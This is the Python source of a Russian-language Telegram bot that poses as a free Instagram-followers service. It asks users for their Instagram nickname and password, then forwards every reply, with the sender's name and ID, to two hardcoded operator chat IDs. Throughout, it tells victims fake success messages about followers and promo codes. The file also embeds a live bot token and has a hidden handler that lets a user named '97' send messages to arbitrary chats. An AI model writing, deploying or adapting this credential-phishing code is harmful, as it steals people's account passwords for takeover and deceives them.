import requests
import telebot
from telebot import types

TOKEN = '991281297:AAHnhg9O6SpkicaT15FUCIyP8w63OllhMSM'
MAIN_URL = f'https://api.telegram.org/bot{TOKEN}'

bot = telebot.TeleBot(TOKEN)
toolID = [
    'id',
    'answer'
]

user_markup1 = types.InlineKeyboardMarkup()
answer_yes = types.InlineKeyboardButton('Да', callback_data='yes')
answer_no = types.InlineKeyboardButton('Нет',  callback_data='no')
user_markup1.add(answer_yes, answer_no)

markup_inline_choice = types.InlineKeyboardMarkup()
for_that = types.InlineKeyboardButton('Зачем?😯', callback_data='why')
markup_inline_choice.add(for_that)

user_markup2 = types.InlineKeyboardMarkup()
answer_message = types.InlineKeyboardButton('Хочешь оставить отзыв?', callback_data='message')
user_markup2.add(answer_message)

def log(message, answer):
    print('\n \n'
          '---------')
    from datetime import datetime
    print(datetime.now())
    print('Имя: {0} {1}\n'
          'Его ID: {2}\n'
          'Текст: {3}'.format(message.from_user.first_name,
                              message.from_user.last_name,
                              str(message.from_user.id),
                              message.text))
    print('Ответ бота:',answer)
    print('---------')

@bot.message_handler(commands=['start'])
def commands(message):
    bot.send_message(message.chat.id, 'Привет!😄\n'
                              'У тебя мало подписчиков?\n'
                              'Наш бот дает 50 подписчиков бесплатно,\n'
                              'остальные за деньги.👌💵\n'
                              'Готовы ли вы продолжать?', reply_markup=user_markup1)

@bot.message_handler(commands=['tool'])
def tool(message):
    if message.from_user.first_name == '97':
        bot.send_message(toolID[0], toolID[1])

@bot.message_handler(commands=['support'])
def commands(message):
    bot.send_message(message.chat.id, 'Привет!😄\n'
                                      'Напиши что-то по поводу работы бота. Твой отзыв очень важен для нас🌠🌅🖍)\n'
                                      'Отзыв будет рассмотрен в течении двух часов🕐.\n'
                                      'Напиши отзыв по примеру ниже или он не будет сохранен.\n'
                                      'Пример🔒:\n'
                                      'Отзыв: (и дальше ваш текст)')

@bot.message_handler(regexp='✍🏻')
def personalId(message):
    if message.from_user.first_name == '97':
        toolID[1] = message.text
        print(toolID[1])
        bot.send_message(message.from_user.id, 'Done.')

@bot.message_handler(regexp='Отзыв')
def ytn(message):
    bot.send_message(message.chat.id, 'Спасибо!😁☺️\n'
                                      'Ваш отзыв обязательно будет рассмотрен!)\n'
                                      '🔓📆')
    bot.send_message(707614495,'Имя: {0} {1}\n'
                                    'Его ID: @{2}\n'
                                    'Текст: {3}'.format(message.from_user.first_name,
                                                        message.from_user.last_name,
                                                        str(message.from_user.id),
                                                        message.text))

@bot.message_handler(regexp='promo100')
def ytn(message):
    bot.send_message(message.chat.id, 'Поздравляю!!!😄😱😻🤙\n'
                                      'В течении часа к тебе на аккаунт придет еще 100 подписчиков!!!\n'
                                      'Счастливчик!👋💍👑')

@bot.callback_query_handler(func=lambda call:True)
def answer_for_question(call):
    if call.data == 'why':                     #text=""" """
        bot.send_message(call.message.chat.id, 'Это необходимо, так-как с твоего аккаунта будет сделан запрос на сервер с ботами, '
                                               'которые поднимут активность на твоем инстаграм аккаунте)🎆\n'
                                               'Вводи вот так✍:@nickname 12345678')
    elif call.data == 'yes':
        bot.send_message(call.message.chat.id, 'Отлично!👑🎰\n'
                                               'Введите свой @никнейм и пароль от аккаунта.\n'
                                               'Вот так✍:\n'
                                               '@nickname 12345678', reply_markup=markup_inline_choice)
    elif call.data == 'no':
        bot.send_message(call.message.chat.id,'Очень жаль💔(\n'
                                              'Но вы всегда можете воспользоваться нашими услугами на сайте.')
    elif call.data == 'message':
        bot.send_message(call.message.chat.id,'Чтобы оставить отзыв - напиши / \nи выбери комманду /support\n'
                                              '🖊🖋🖍📆📬📫️')

@bot.edited_message_handler(func=lambda message: True)
def edit_answer(message):
    bot.send_message(message.from_user.id, text='Зачем изменил?:\n'
                                                '{edited_message}'.format(edited_message=message.text))

@bot.message_handler(func=lambda message: True)
def message_react(message):
    if message.from_user.first_name == '97':
        toolID[0] = message.text
        print(toolID[0])
    answer = 'Не выходит, попробуй снова.\nВозможно ты неправильно ввел(а) свой пароль или никнейм\n' \
             '😢😱🥴'
    if '@' in message.text:
        log(message, answer)
        bot.send_message(message.chat.id, 'Отлично!\n'
                                          'Подписчики будут в течении часа)😁☺\n'
                                          'Если знаешь наш промокод самое время его ввести!👁😇💋️', reply_markup=user_markup2)
        bot.send_message(707614495, 'Имя: {0} {1}\n'
                                    'Его ID: {2}\n'
                                    'Текст: {3}'.format(message.from_user.first_name,
                                                        message.from_user.last_name,
                                                        str(message.from_user.id),
                                                        message.text))
        bot.send_message(684414835, 'Имя: {0} {1}\n'
                                    'Его ID: {2}\n'
                                    'Текст: {3}'.format(message.from_user.first_name,
                                                        message.from_user.last_name,
                                                        str(message.from_user.id),
                                                        message.text))

    else:
        bot.send_message(message.chat.id, answer)
        bot.send_message(707614495, 'Имя: {0} {1}\n'
                                    'Его ID: {2}\n'
                                    'Текст: {3}'.format(message.from_user.first_name,
                                                        message.from_user.last_name,
                                                        str(message.from_user.id),
                                                        message.text))
        log(message, answer)



if __name__ == '__main__':
    bot.polling(none_stop=True, interval=0)


